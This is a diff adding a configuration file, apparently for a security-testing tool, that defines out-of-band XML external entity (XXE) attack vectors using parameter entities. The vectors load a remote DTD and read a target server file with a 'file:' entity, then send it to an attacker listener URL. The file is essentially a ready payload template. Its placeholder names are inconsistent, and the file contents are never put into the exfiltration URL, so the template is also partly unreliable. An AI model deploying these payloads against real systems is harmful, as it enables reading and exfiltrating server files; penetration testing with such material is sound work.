@@ -1,0 +1,22 @@
+<config>
+<name>XXE OOB Attack - Parameter Entities</name>
+<description>...</description>
+<params>
+    <dosbox>false</dosbox>
+    <targetFile>true</targetFile>
+    <helperURL>true</helperURL>
+    <attackListenerURL>true</attackListenerURL>
+</params>
+<attackvectors>
+<attackvector><![CDATA[<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "§tf_helperURL§">
+%remote;
+%send;
+]>
+<data>4</data>]]></attackvector>
+<attackvector><![CDATA[<!ENTITY % payload SYSTEM "file:§tf_targetFILE§">
+<!ENTITY % param1 "<!ENTITY &#37; send SYSTEM '§tf_listenURL§'>">
+%param1;]]></attackvector>
+</attackvectors>
+</config>
